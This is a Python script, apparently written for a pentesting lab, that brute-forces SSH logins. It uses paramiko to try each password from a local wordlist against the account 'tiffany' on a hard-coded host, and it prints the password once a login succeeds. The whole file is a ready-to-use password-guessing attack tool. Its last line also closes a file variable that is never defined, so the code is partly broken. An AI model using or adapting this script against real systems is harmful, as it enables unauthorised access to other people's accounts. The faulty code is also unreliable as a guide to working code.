import paramiko
import sys
import os

#target = str(input('Please enter target IP address: '))
target = "10.10.59.209"
#username = str(input('Please enter username to bruteforce: '))
username = "tiffany"
#password_file = str(input('Please enter location of the password file: '))
password_file = "D:/Pentest/Py/wordlist2.txt"

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()